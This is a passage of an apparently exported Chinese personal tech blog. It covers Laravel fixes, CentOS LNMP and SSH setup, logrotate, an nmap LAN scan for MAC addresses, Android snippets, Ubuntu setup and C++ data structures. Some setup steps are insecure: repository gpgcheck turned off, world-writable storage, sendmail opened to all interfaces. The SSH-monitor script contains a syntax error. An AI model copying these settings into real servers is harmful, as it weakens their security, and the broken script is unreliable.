Illuminate\Database\Eloquent\Relations\Relation在写Student模型的时候，将一个方法命名为sex，但Student又有一个属性是sex，两者相冲突了，因此需要将sex方法重新命名以解决冲突 无法修改和删除数据这是我遇到的巨坑的一次，原因在于Student Model中将主码写错了，原本应该是id，被我写成了ID，然后一直被找出来，之前就有预感是Student Model错了，但是我检查了很多遍都没注意，吐血。。。 PDOException in Connector.php line 55:could not find driver就像报错说的没有找到driver(驱动)，所以少了什么呢，少了php连接mysql的module(组件)，组件名字pdo_mysql，安装组件后重启php-fpm和nginx 1yum install php70w-mysql Laravel sessions not working on server这个问题困扰我两天吧，然后先说遇到的问题，就是在浏览器中修改数据或者添加数据等操作后，应该在页面有一个提示消息，我单独分离出来用Session实现，在php内带服务器上可以正常工作，但是在我的server中却无法实现。解决方法是修改文件model 1chmod -R a+rw storage/ ErrorException in e4e354417ec7f106982a7198b9ad5688b9936b71.php line 1: Undefined variable: errors这个跟中间件有关系，主要实在5.2版本中会遇到，解决方案是将Kernel.php中的$middlewareGroups的内容移到$middleware中 No supported encrypter found. The cipher and / or key length are invalid.执行php artisan key:generate就 ok 项目源码laravel-ubuntu]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS]]></title>
    <url>%2F2017%2F06%2F16%2Fcentos%2F</url>
    <content type="text"><![CDATA[第一关：设置windows启动项在安装双系统时，选择centos会默认没有windows的启动项，因此要添加windows的引导选项，过程如下： 开机进入CentOS系统 进入目录/boot/grub2，打开grub.cfg进行编辑 找到其中第70行，在指定位置添加内容 添加内容如下： 123456### END /etc/grub.d/00 header ###menuentry 'Windows 10' &#123; set root=(hd0,1) chainloader +1&#125;### BEGIN /etc/grub.d/10_linux ### 重启系统，引导菜单中新增了windows 10选项 第二关：防火墙下载防火墙服务：1[root@localhost]$ yum install iptables-services 查看防火墙状态：1[root@localhost]$ nmap localhost -p 0-10000 启用ssh服务：1234[root@localhost]$ yum install openssh-server[root@localhost]$ chkconfig sshd on[root@localhost]$ service sshd restart[root@localhost]$ /etc/init.d/sshd start 在CentOS 7之前，系统默认的防火墙为iptables，因此上述为iptables版防火墙设置，下列为firewall版防火墙设置，firewall是centOS 7系统默认的防火墙，想必也是之后的趋势。查看firewall状态：1[root@localhost]$ systemctl status firewalld.service 开启firewall服务（两者均可）12[root@localhost]$ systemctl start firewalld.service[root@localhost]$ service firewalld start 开启ssh服务：1[root@localhost]$ yum install openssh-server 更改默认ssh端口：1[root@localhost]$ vim /etc/ssh/sshd_config 修改里面的端口为自己想要设置的端口，保存退出，由于系统默认不支持ssh使用22端口之外的端口，因此需要做修改：123456[root@localhost]$ semanage port -a -t ssh_port_t -p tcp ××××[root@localhost]$ semanage port -l | grep ssh[root@localhost]$ systemctl restart sshd.service[root@localhost]$ firewall-cmd --permanent --zone=public --add-port=××××/tcp[root@localhost]$ firewall-cmd --reload[root@localhost]$ ss -tnlp | grep ssh 第三关：lnmp配置安装nginx:123[root@localhost]$ yum install epel-release[root@localhost]$ yum -y install nginx[root@localhost]$ service nginx start 或者/etc/yum.repo.d/nginx.repo1234[nginx]baseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=0enabled=1 安装php7.0(CentOS 7.x):1234rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpmyum install php70w php70w-opcacheyum install php70w-fpm php70w-opcache 安装php7.0不太容易，建议多在网上查 设置nginx，更改root目录问题：之前将nginx的root目录改了过后出现了403问题，搞了好久还是没有一个很完整的解决方案，不过找到一个方案，但还是不太理解。将nginx中的配置文件的user nginx 改为自己的用户名，即更改过后root目录的所有者。困惑点在于nginx默认的目录/usr/share/nginx/html的所有者为root但没有出现403 安装mysql:123456# yum install mysql# yum install mysql-devel# wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm# rpm -ivh mysql-community-release-el7-5.noarch.rpm# yum install mysql-community-server# service mysqld restart 配置问题1.配置php.ini: 只修改一行代码，通过vim查找cgi.fix_pathinfo，并将其修改为0,去注释.2.配置www.conf: 修改listen选项设置为127.0.0.1:9000; 设置user为/home下的一个用户,group也同样设置3.配置nginx.conf,将user改为www.conf里面的user相同，网站根目录必须在nginx的user下,具体配置如下123456location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; 第四关：ssh登录邮件通知（后面有彩蛋哟）游手好闲地折腾了几天，突发奇想，前几天租了一个vps，想随时检测有没有人通过ssh登录我的vps，如果有人登录，就发邮件通知，于是有了以下的折腾： 首先安装必备的软件sendmail 和mailx 通过last命令和awk结合获取ssh登录情况 最后写个python程序，让它一直跑着随时准备发邮件 将写好的程序运行命令写入/etc/rc.d/rc.local，让它开机运行 那么命令如下：123[root@localhost]$ yum install sendmail sendmail-cf mailx[root@localhost]$ service sendmail start[root@localhost]$ last | awk '$1=="root"' 接下来需要修改一个配置文件，让sendmail可以给整个英特网发送邮件，配置文件为/etc/mail/sendmail.mc，其中有一行1DAEMON_OPTIONS('port=smtp,Addr=127.0.0.1, Name=MTA-v6, Family=net6')dnl 将127.0.0.1改为0.0.0.0，这样就可以给整个英特网发送邮件了python脚本如下 123456789101112131415161718import osinst = "last | awk \'$1!=\"reboot\"\'"str = os.popen(inst).read()ssh_login = str.split("\n")length = len(ssh_login)while True: inst1 = "last | awk \'$1!=\"reboot\"\' &gt; ssh_login.txt" os.system(inst1) str = os.popen(inst).read() ssh_login = str.split("\n length1 = len(ssh_login) if length1 &gt; length: login_name = ssh_login[0] mail = "echo %s | mail -s \'$1!=\"reboot\"\' ××××@qq.com" % login_name os.system(mail) length = length1 最重要的一点：qq邮箱发送成功一次过后vps的域名就会被拉黑，被认为是垃圾邮件，因此需要在邮箱管理界面设置域名白名单localhost.localdomain，然后大功告成，哈哈 你以为这样就了事了？如果你将这个程序通过开机启动让它一直跑着，那么很开心的告诉你，你的机器cpu用不了多久就会被占满，所以，这个方法还是不行滴，这只是一种理想思路，想要处理的话可以选择指定时间运行一次或者每隔一段时间运行一次。接下来我去找个比较好的方式来实现这个功能，并实现每天发送当天的日志文件。 我的vps跑了几个小时后的cpu受不了了，跑了不到两个小时，就被厂家限制了。 第五关：python实现邮件发送没时间了，直接贴代码12345678910111213141516171819202122232425from email import encodersfrom email.header import Headerfrom email.mime.text import MIMETextfrom email.utils import parseaddr, formataddrimport smtplibdef _format_addr(s): name, addr = parseaddr(s) return formataddr((Header(name, 'utf-8').encode(), addr))from_addr = "××××××××××@qq.com"password = "××××××××××" # SMTP独立密码to_addr = "××××××××××@qq.com"smtp_server = "smtp.qq.com"msg = MIMEText('hello, send by Python...', 'plain', 'utf-8')msg['From'] = _format_addr('fenlan &lt;%s&gt;' % from_addr)msg['To'] = _format_addr('管理员 &lt;%s&gt;' % to_addr)msg['Subject'] = Header('vps远程登录日志', 'utf-8').encode()server = smtplib.SMTP_SSL(smtp_server, 465)server.login(from_addr, password)server.sendmail(from_addr, [to_addr], msg.as_string())server.quit() 第六关：搭建laravel框架首先安装composer(一个php工具，具体查看官网)1234php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"php -r "if (hash_file('SHA384', 'composer-setup.php') === '669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;"php composer-setup.phpphp -r "unlink('composer-setup.php');" 然后全局使用composer1mv composer.phar /usr/local/bin/composer 接着安装laravel1composer create-project --prefer-dist laravel/laravel your_project_name 进入项目目录更新composer1composer update 在这里我遇到了一个问题，我搭建三次只遇见过一次根据提示进入里面说的网站上，跟着网站描述解决问题就ok]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>firewall</tag>
        <tag>lnmp</tag>
        <tag>python</tag>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[logrotate]]></title>
    <url>%2F2017%2F06%2F14%2Flogrotate%2F</url>
    <content type="text"><![CDATA[logrotate介绍对于Linux系统安全来说，日志文件是及其重要的工具。日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。当日志文件不断增长的时候，就需要定时切割，否则，写日志的速度和性能也会下降，更不便于我们归档和查询。所以便有了使用logrotate的时候，logrotate是十分有用的工具，它可以自动对日志进行截断、压缩以及删除旧的日志文件。例如，你可以设置logrotate，让/var/log里的日志文件没30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何一步的人为干预。 logrotate配置文件位置Linux系统默认安装logrotate工具，它默认的配置文件在:/etc/logrotate.conf/etc/logrotate.d/ 定时轮循机制 /etc/cron.daily/logrotate中定义了每天定时执行的任务 /etc/cron.weekly/logrotate中定义了每个星期定时执行的任务 /etc/cron.hourly/logrotate中定义了每小时定时执行的任务 /etc/cron.monthly/logrotate中定义了每个月定时执行的任务 /etc/crontab规定了轮循的时间 /etc/cron.daily/下面的任务都是每天6:25执行 /etc/cron.weekly/下面的任务都是每周日6:47执行 /etc/cron.monthly/下面的任务都是每月1号6:52执行]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>logrotate</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取局域网连接设备mac地址]]></title>
    <url>%2F2017%2F03%2F22%2Fnmap_mac%2F</url>
    <content type="text"><![CDATA[使用工具nmap: 也就是Network Mapper,最早是linux下的网络扫描和嗅探工具包nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络端口。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。他是网络管理员比用的软件之一，以及用以评估网络系统安全。 步骤1.通过nmap扫描出连接同一局域网的设备的ip 地址以及 mac 地址，扫描完成再以xml 文件形式储存起来。具体命令如下：1# nmap -sP -oX myscan.xml 192.168.1.0/24 需要注意的问题： 如果要获取mac 地址，需要操作系统的管理者权限，对于Linux来说就是root 权限；另外，由于是通过发包探测，如果遇上有防火墙的路由器，会比较麻烦。缺点： 在扫描设备多的情况下，时间会偏长，亲试最长时间21秒，这根被扫描设备的状态有关。 2.使用python 获取xml 文件中的mac 地址存入指定文件：12345678910111213141516171819# readxml.pyfrom xml.dom import minidomf = open("maclist.txt", 'wb') # 存入mac 地址的目标文件xmldoc = minidom.parse('myscan.xml') # 获取 nmap 导出的 xml 文件addrlist = xmldoc.getElementsByTagName('address')len = (len(addrlist)-1) / 2 # 计算连接设备数量# 在addrlist 中有 IP 地址 和 mac 地址，因此要减半print "len :", lenf.write(str(len))f.write("\n")for s in addrlist : if s.attributes['addrtype'].value == "mac" : f.write(s.attributes['addr'].value) f.write("\n") f.close() 3.将两个命令写在一个脚本里面：1234#!/bin/bashnmap -sP -oX myscan.xml 192.168.1.0/24python readxml.py 4.运行脚本搞定]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[许久没有更新的流水账]]></title>
    <url>%2F2016%2F11%2F20%2F%E6%B5%81%E6%B0%B4%E8%B4%A6%2F</url>
    <content type="text"><![CDATA[好久没有更新博客了，有很多原因。一方面，前段时间事情太多，大概花了一个月来写一个android聊天软件来参加，学校的比赛，虽然写好了，也还像个样子，但在最后答辩的时候选择了放弃。因为国创答辩失败了，恰好那个比赛的答辩和国创答辩同时进行的，所有带着沮丧的心情离开了。另一方面，换了一台电脑工作，而我的博客后台在原来的电脑上，我一直想将它迁移到新的电脑上，然而一直没有成功。因此，大概有托更了3个月的博客，现在静下心来总结一下最近的学习。 Android项目经验1.Toolbar上实现返回按钮123456backButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; onBackPressed(); //实现返回功能 &#125; &#125;); 1234public void onBackPressed() &#123; // TODO Auto-generated method stub super.onBackPressed(); &#125; 2.listview自定义Adapter123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130public class Chatting_Adapter extends BaseAdapter &#123; private static final int PAGE_MESSAGE_COUNT = 30; public static String USERNAME = "com.example.username"; public static String MYNAME = "com.example.myname"; private List&lt;cn.jpush.im.android.api.model.Message&gt; chatting_list; private LayoutInflater myInflater; private Context mContext; private int mStart; private int mOffset = PAGE_MESSAGE_COUNT; private Conversation mConversation; public Chatting_Adapter(Context context, String UserName, List&lt;Message&gt; chatting_list) &#123; this.USERNAME = UserName; this.mContext = context; this.mStart = mOffset; this.chatting_list = chatting_list; myInflater = LayoutInflater.from(context); &#125; //返回数据集长度 @Override public int getCount() &#123; return chatting_list.size(); &#125; @Override public Object getItem(int position) &#123; return chatting_list.get(position); &#125; @Override public long getItemId(int position) &#123; return position; &#125; public void setData(List&lt;Message&gt; chatting_list) &#123; // TODO Auto-generated method stub this.chatting_list = chatting_list; &#125; @Override public View getView(final int position, View view, ViewGroup viewGroup) &#123; Message message = chatting_list.get(position); ViewHolder holder; if(view == null) &#123; view = myInflater.inflate(R.layout.chat_text_ui, viewGroup, false); holder = new ViewHolder(); holder.left_layout = (RelativeLayout)view.findViewById(R.id.left_layout); holder.friend_username = (TextView)view.findViewById(R.id.left_tv_name); holder.friend_head = (ImageView)view.findViewById(R.id.left_iv_portrait); holder.left_chatting_message = (TextView)view.findViewById(R.id.left_tv_content); holder.left_chatting_time = (TextView)view.findViewById(R.id.left_tv_time); holder.right_layout = (RelativeLayout)view.findViewById(R.id.right_layout); holder.myname = (TextView)view.findViewById(R.id.right_tv_name); holder.my_head = (ImageView)view.findViewById(R.id.right_iv_portrait); holder.right_chatting_message = (TextView)view.findViewById(R.id.right_tv_content); holder.right_chatting_time = (TextView)view.findViewById(R.id.right_tv_time); view.setTag(holder); &#125; else &#123; holder = (ViewHolder)view.getTag(); &#125; if (message.getFromUser().getUserName() == JMessageClient.getMyInfo().getUserName()) &#123; holder.right_layout.setVisibility(View.VISIBLE); holder.left_layout.setVisibility(View.GONE); holder.myname.setText(message.getFromUser().getUserName()); //holder.friend_head.setImageResource(R.mipmap.friend_head); TimeFormat timeFormat = new TimeFormat(mContext, message.getCreateTime()); holder.right_chatting_time.setText(timeFormat.getTime()); TextContent textContent = (TextContent) message.getContent(); holder.right_chatting_message.setText(textContent.getText()); &#125; else &#123; holder.left_layout.setVisibility(View.VISIBLE); holder.right_layout.setVisibility(View.GONE); holder.friend_username.setText(message.getFromUser().getUserName()); //holder.friend_head.setImageResource(R.mipmap.friend_head); TimeFormat timeFormat = new TimeFormat(mContext,message.getCreateTime()); holder.left_chatting_time.setText(timeFormat.getTime()); TextContent textContent = (TextContent) message.getContent(); holder.left_chatting_message.setText(textContent.getText()); &#125; return view; &#125; private void incrementStartPosition() &#123; ++mStart; &#125; public void clearMsgList() &#123; chatting_list.clear(); mStart = 0; notifyDataSetChanged(); &#125; public Message getLastMsg() &#123; if (chatting_list.size() &gt; 0) &#123; return chatting_list.get(chatting_list.size() - 1); &#125; else &#123; return null; &#125; &#125; public void addMsgToList() &#123; chatting_list.clear(); mConversation = JMessageClient.getSingleConversation(USERNAME); chatting_list = mConversation.getMessagesFromNewest(0,mOffset); Collections.reverse(chatting_list); //chatting_list.add(msg); //incrementStartPosition(); notifyDataSetChanged(); &#125; private class ViewHolder &#123; RelativeLayout left_layout; TextView friend_username; TextView left_chatting_message; TextView left_chatting_time; ImageView friend_head; RelativeLayout right_layout; TextView myname; TextView right_chatting_message; TextView right_chatting_time; ImageView my_head; &#125;&#125; 使用自定义Adapter12friendListAdapter = new FriendListAdapter(Friend_List.this, friendlist); Friend_List.setAdapter(friendListAdapter); 3.退出确认Dialog123456789101112131415161718192021public void exitActivity()&#123; new AlertDialog.Builder(this).setTitle("确认退出吗？") .setIcon(android.R.drawable.ic_dialog_info) .setPositiveButton("确定", new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; // 点击“确认”后的操作 JMessageClient.logout(); Friend_List.this.finish(); &#125; &#125;) .setNegativeButton("返回", new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; // 点击“返回”后的操作,这里不设置没有任何操作 &#125; &#125;).show(); &#125; 4.不结束软件退出123456789101112@Override public boolean onKeyDown(int keyCode, KeyEvent event) &#123; if (keyCode == KeyEvent.KEYCODE_BACK) &#123; Intent home = new Intent(Intent.ACTION_MAIN); home.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP); home.addCategory(Intent.CATEGORY_HOME); startActivity(home); return true; &#125; return super.onKeyDown(keyCode, event); &#125; 5.为软件插入启动广告123456789101112131415161718public class LaunchActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); //加载启动界面 setContentView(R.layout.activity_launch); //当计时结束时，调至主界面 Handler handler = new Handler(); handler.postDelayed(new Runnable() &#123; @Override public void run() &#123; startActivity(new Intent(LaunchActivity.this, MainActivity.class)); LaunchActivity.this.finish(); &#125; &#125;, 3000); //界面停留时间 &#125;&#125; 更多内容在github上 目前学习进度现在已经将之前的电脑作为了服务器，目前正在熟悉网站开发一整套流程。目标是熟悉使用php大法，css和javascript,数据库这个东西讲道理我不想接触，但是没办法，这一关必须得过。虽然有xml，但是xml并不是合理的选择,所以继续学呗。最近在一些新闻上看到android可能有新的发展方向，可能会逐渐走向闭源。怎么说呢，即使google是这样想的，但是这肯定是一个比较漫长的过程，不管怎么说，google不会放弃中国这个市场的，因此也不会拒绝中国的开发人员，因此，学习Android仍然是可行的，最近从图书馆借了一本书，准备系统性的学习一下Android，结束以前的野路子。 对于国创失败的感悟很不幸，我的第一次国创之路失败了，对此做个总结。首先，在找队友的路上，我就走得很不顺。找不到可靠的队友，最后无奈自己来做队长，基本上所有的事情都由我一手独揽。原本准备让一个队友写计划书，然而到了要交计划书的时候他告诉我他没有电脑，写不出来，所以退出。在最后一两天临时找了一个学弟凑人数，然后自己一个人忙着所有的事情。其次，在方向上出现问题。之前一直找不到方向，然后找了一个高中同学聊了半天，决定了一个方向，然而由于我迫切地想要接入小米的接口，使得我计划的整个项目没有创新点，这也成了国创失败的主要原因。归咎下来，主要还是因为我太一意孤行了，之前迫切想要接入小米接口，队友也不好阻止我，就放任我走向一个死胡同。不知道是什么原因，一直没有找到可以一起学习、一起做项目的同伴，在一个人瞎摸索的路上举步维艰，时不时地出现迷茫的情况，不知道自己想要学什么，不知道自己想要做出个什么项目。总是在一个人的路上走走停停。所以，现在真的想寻求一个可靠的同伴一起学习、一起做项目。 新的信仰国创答辩刚刚结束，学院就来了一个讲座，dota女神前来宣讲。讲道理，女神真的很优秀，特别喜欢她信仰的那句话 ：所有事情到最后都将是好的结局，如果不好，那么就不是结局.：Everything gonna be fine in the end,if it’s not fine,it’s not the end.]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu安装配置]]></title>
    <url>%2F2016%2F08%2F10%2Fubuntu%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[想了一下，最终还是将电脑安成windows10 + ubuntu16双系统，以后多用用ubuntu试试。我选择的安装方式使用u盘安装，在安装ubuntu时一直没有选对启动盘制作工具，之前安装windows10的时候使用的是UltraIso，这个安windows没什么问题，但是安装ubuntu时，安不上，后面上网查了很多次，也用了其他的软件，比如linuxLive USB Creator,Universal-USB-Installer等等，其中Universal-usb-installer还是ubuntu推荐的软件，但是仍然不行，就这我折腾了两天还是没成功，后来在qq上的一个业余群里面，有人叫我用USBwriter，结果就成功安装上了。 ubuntu有线联网感觉每一项都挺折腾的，百度google都查了很多，这一步我是在终端完成的1$ sudo pppoeconf 然后根据提示输入用户名和密码就行了 Chrome安装很抱歉，我有google强迫症，没它不行，所以直接在官网下载软件包，然后再终端安装1$ sudo dpkg -i 软件包名 其实有很多安装方式，百度google多问一下就行了 安装软件出现未满足依赖方法就是软件更新器更新，也有这个命令12$ sudo apt-get install -f$ sudo apt-get update 我上面的命令都不管用了，因为我下载了android studio，然后就出问题了，出现没有满足依赖，后来把android studio卸载了才能更新软件包的1$ sudo apt-get remove android-studio 系统软件包更新后仍然没有安上android studio 安装jdk跟安装chrome一样，不过要配置环境这里就不浪费时间，直接引用Ubuntu 11.04,14.04 下安装配置 JDK 7,JDK 8具体根据自己的情况去设置 chrome翻墙这里有写得很好的博客关于翻墙的linux-ubuntu使用shadowsocks客户端配置 里面全部都有，很详细。 git安装这个我的博客里有，还有hexo和博客关联都有 安装android studio还在努力中。。。。。已经完成了，不过并不想写。哎，太懒了，其实也没有多难，只是要配好java环境,然后我的android studio是用命令打开，打开一个后缀是.sh的文件就行 vim配置主要是两个文件夹，一个是/etc/vim,一个是~/.vim,具体的还是要多google，我到现在也没弄清楚 经过我不懈的努力，终于比较完善了，有代码高亮，自动补全，错误检测，还有nerdtree功能，这些都可以用bundle安装，先安装bundle，然后再在vimrc文件中配置Plugin + 插件，完成后重新打开vim，输入命令PluginInstall就ok。总结一下我用的vim的插件：syntastic(实现代码检测功能)、YouCompleteMe(自动补全最好的插件，没有之一，我这么觉得的)、nerdtree(可以在vim的左侧显示文件目录)，其他的我有点忘了，不过弄好这三个我已经满意了，以后试着有vim,不过讲真，vim还是不太适合写较大的程序，我这么觉得的 gcc编译器问题最近我自己写了一些代码，有自己定义的头文件，在ubuntu中用gcc编译器编译时总是出现许多对‘XXX’未定义的引用，我疑惑了很久，后来意外的解决了，一个原因是要编译多个源文件的程序时，所有的源文件都要放在一起编译，还有就是用math.h头文件时要在命令最后加上-lm,还有用ncurses.h头文件时也要用-lcurses,什么原因要是要google搜搜，最后吐槽一下自己，发现自己已经在c这门语言的路上越走越远，我并不想这样，感觉写什么程序都要被迫用c，我想学用python,java。然而到目前为止，我仍然对他们很陌生，好苦逼 atom编辑器atom是一个类似sublime text的编译器，但是个人观点atom好看到无解，好用好看，是真的好。这是我强烈推荐的一款软件，不用真的会后悔，这还是寝室大神告诉我的，我偶然看见他在用，就问是什么编译器。我推荐给另一个人的时候，他居然居然说什么编译器都一样，只要能用就行。我愣了！他还在用Dev，有visual studio这样强大的东西，又有atom那么好看的东西，他居然还在用Dev。反正我是无法理解。 主题推荐ubuntu上主题好看的不少，个人钟情与flatabulous，这个主题满足了我的个人审美，具体操作看这篇博文： http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html ubuntu配置QQ之前试过好多次没成功，意外之间找到了一个网站便用上了，能满足一般的QQ要求，跟windows的QQ很像，网站如下： http://ttop5.net/?p=1316 ubuntu写markdown工具推荐haroopad，很好用，可以实时显示效果,推荐博文： http://www.jianshu.com/p/064aec7a5164]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构c++]]></title>
    <url>%2F2016%2F07%2F23%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[1.数据结构之队列 数据结构中的队列所遵循的原则是先进先出的排队原则，即先存放的先先取出。同时队列分为普通队列和环形队列，其中普通队列是非闭合队列，效率和利用率低；相反，环形队列为首尾闭合的队列，可以实现不断取出又不断放进，效率和利用率高。 队列有列首、列尾、列容量、列长度等名词，在此不解释了。 接下来放代码Customer.h中的代码1234567891011121314151617# ifndef CUSTOMER_H# define CUSTOMER_H# include &lt;string&gt;using namespace std;class Customer&#123;public: Customer(string name = "", int age = 0); void printInfo() const;private: string m_strName; int m_iAge;&#125;;# endif Customer.cpp中的代码123456789101112131415# include &lt;iostream&gt;# include "Customer.h"using namespace std;Customer::Customer(string name, int age)&#123; m_strName = name; m_iAge = age;&#125;void Customer::printInfo() const&#123; cout &lt;&lt; "姓名" &lt;&lt; m_strName &lt;&lt; endl; cout &lt;&lt; "年龄" &lt;&lt; m_iAge &lt;&lt; endl;&#125; MyQueue.cpp中的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# include "MyQueue.h"# include &lt;iostream&gt;using namespace std;MyQueue::MyQueue(int queueCapacity)&#123; m_iQueueCapacity = queueCapacity; m_pQueue = new Customer[m_iQueueCapacity]; ClearQueue();&#125;MyQueue::~MyQueue()&#123; delete []m_pQueue; m_pQueue = NULL;&#125;void MyQueue::ClearQueue()&#123; m_iHead = 0; m_iTail = 0; m_iQueueLen = 0;&#125;bool MyQueue::QueueEmpty() const&#123; if (m_iQueueLen == 0) &#123; return true; &#125; else &#123; return false; &#125;&#125;int MyQueue::QueueLength() const&#123; return m_iQueueLen;&#125;bool MyQueue::QueueFull() const&#123; if (m_iQueueLen == m_iQueueCapacity) &#123; return true; &#125; return false;&#125;bool MyQueue::EnQueue(Customer element)&#123; if (QueueFull()) &#123; return false; &#125; else &#123; m_pQueue[m_iTail] = element; m_iTail++; m_iTail = m_iTail % m_iQueueCapacity; m_iQueueLen++; return true; &#125;&#125;bool MyQueue::DeQueue(Customer &amp;element)&#123; if (QueueEmpty()) &#123; return false; &#125; else &#123; element = m_pQueue[m_iHead]; m_iHead++; m_iHead = m_iHead % m_iQueueCapacity; m_iQueueLen--; return true; &#125;&#125;void MyQueue::QueueTraverse()&#123; for (int i = m_iHead; i &lt; m_iQueueLen + m_iHead; i++) &#123; m_pQueue[i%m_iQueueCapacity].printInfo(); cout &lt;&lt; "前面还有" &lt;&lt; (i-m_iHead) &lt;&lt; "人" &lt;&lt; endl; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125; MyQueue.h中的代码1234567891011121314151617181920212223242526# ifndef MYQUEUE_H# define MYQUEUE_H# include "Customer.h"class MyQueue&#123;public: MyQueue(int queueCapacity); //创建队列 virtual ~MyQueue(); //销毁队列 void ClearQueue(); //清空队列 bool QueueEmpty() const; //判空队列 bool QueueFull() const; //判满队列 int QueueLength() const; //队列长度 bool EnQueue(Customer element); //新元素入队 bool DeQueue(Customer &amp;element); //首元素出队 void QueueTraverse(); //遍历队列private: Customer *m_pQueue; //队列数组指针 int m_iQueueLen; //队列元素个数 int m_iQueueCapacity; //队列数组容量 int m_iHead; int m_iTail;&#125;;# endif demo.cpp中的代码1234567891011121314151617181920212223242526# include &lt;iostream&gt;# include &lt;stdlib.h&gt;# include "MyQueue.h"# include "Customer.h"using namespace std;int main(void)&#123; MyQueue *p = new MyQueue(4); Customer c1("张三",20); Customer c2("李四",30); Customer c3("王五",25); p-&gt;EnQueue(c1); p-&gt;EnQueue(c2); p-&gt;EnQueue(c3); p-&gt;QueueTraverse(); Customer c4("",0); p-&gt;DeQueue(c4); c4.printInfo(); system("pause"); return 0;&#125; 2.数据结构之栈讲真，假期学习真的好难，我好不容易静下心来再学，其实之前已经学了，只是博客没做记录，今天补上。栈是很简单的模型，就是相当于一个瓶子，放东西进去，先放的在下面，后放的在上面，所以遵循后进先出原则，栈的栈底始终不变，栈顶随放入数量增加而上升。差不多就这些，今天的代码很简单，遵循我写代码不麻烦，理解容易原则 接下来放代码MyStack.h1234567891011121314151617181920212223# ifndef MYSTACK_H# define MYSTACK_Hclass MyStack&#123;public: MyStack(int size); //分配内存初始化栈空间，设定栈容量，栈顶 ~MyStack(); //回收栈空间内存 bool stackEmpty(); //判断栈是否为空，为空返回true,非空返回false bool stackFull(); //判断栈是否为满，为满返回true，非满返回false void clearStack(); //清空栈 int stackLength(); //已有元素个数 bool push(char elem); //元素入栈，栈顶上升 bool pop(char &amp;elem); //元素出栈，栈顶下降 void stackTraverse(bool isFromButtorm); //遍历栈中所有元素private: char *m_pBuffer; //栈空间指针 int m_iSize; //栈容量 int m_iTop; //栈顶，栈中元素个数&#125;;# endif MyStack.cpp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# include "MyStack.h"# include &lt;iostream&gt;using namespace std;MyStack::MyStack(int size)&#123; m_iSize = size; m_pBuffer = new char[size]; m_iTop = 0;&#125;MyStack::~MyStack()&#123; delete []m_pBuffer;&#125;bool MyStack::stackEmpty()&#123; if (0 == m_iTop) //此处为了优秀代码，也可写成 m_iTop == 0; &#123; return true; &#125; return false;&#125;bool MyStack::stackFull()&#123; if (m_iTop == m_iSize) &#123; return true; &#125; return false;&#125;void MyStack::clearStack()&#123; m_iTop = 0;&#125;int MyStack::stackLength()&#123; return m_iTop;&#125;bool MyStack::push(char elem)&#123; if (stackFull()) &#123; return false; &#125; m_pBuffer[m_iTop] = elem; m_iTop++; return true;&#125;bool MyStack::pop(char &amp;elem)&#123; if (stackEmpty()) &#123; return false; &#125; m_iTop--; elem = m_pBuffer[m_iTop]; return true;&#125;void MyStack::stackTraverse(bool isFromButtorm)&#123; if (isFromButtorm) &#123; for (int i = 0; i &lt; m_iTop; i++) &#123; cout &lt;&lt; m_pBuffer[i] &lt;&lt; ","; &#125; &#125; else &#123; for (int i = m_iTop-1; i &gt;= 0; i--) &#123; cout &lt;&lt; m_pBuffer[i] &lt;&lt; ","; &#125; &#125;&#125; demo.cpp123456789101112131415161718192021222324252627282930313233343536373839404142# include &lt;stdlib.h&gt;# include "MyStack.h"# include &lt;iostream&gt;using namespace std;int main(void)&#123; MyStack *pStack = new MyStack(5); pStack-&gt;push('h'); pStack-&gt;push('e'); pStack-&gt;push('l'); pStack-&gt;push('l'); 